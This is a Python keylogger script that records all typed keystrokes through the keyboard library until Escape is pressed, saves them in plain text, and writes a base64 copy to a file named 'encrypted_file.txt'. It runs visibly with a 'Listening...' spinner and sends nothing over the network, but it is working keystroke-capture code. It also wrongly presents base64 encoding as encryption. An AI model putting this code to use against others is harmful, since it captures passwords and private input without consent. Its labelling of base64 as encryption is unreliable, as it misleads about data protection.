import keyboard as kb
import time
import sys 
import threading as th
import os
import base64


data = [] # stores ketsrokes
escapeIsPressed = th.Event()

scriptDirectory = os.path.dirname(os.path.realpath(__file__))
os.chdir(scriptDirectory)

# funtion to record keystrokes
def keystrokes():
    global data
    
    listen = kb.record(until="Escape") 
    data= kb.get_typed_strings(listen)
    escapeIsPressed.set()

    with open("encrypt.txt", "w") as _file:
        content = "\n".join(data)
        _file.write(content)
        data = [] # set data to empty

    with open("encrypt.txt", "r") as rec_strokes:
        temp = rec_strokes.read()
        data.append(temp)

        for i in range(len(data)):
            _bytes = data[i].encode('utf-8')       # strings to bytes
            en_bytes = base64.b64encode(_bytes)    # bytes to base64 encoding
            en_string = en_bytes.decode('utf-8')   # bytes to string
            
            with open("encrypted_file.txt", "w") as en_file:
                en_file.write(en_string)

# visible thread
def listen_function():
    animation = "|/-\\"
    boolean = True 
    num = 0

    # thread ___> keystrokes
    thread = th.Thread(target=keystrokes)
    thread.daemon = True
    thread.start() # thread start

    # animation loop _> [Listening...]
    while boolean:
        time.sleep(0.1)
        sys.stdout.write("\rListening... " + animation[num % len(animation)])
        sys.stdout.flush()
        num += 1

        if escapeIsPressed.is_set():
            # os.system("cls")
            boolean = False
    
    thread.join()
    time.sleep(0.5)

# main entry point
if __name__ == "__main__":
    os.system("cls")
    listen_function()
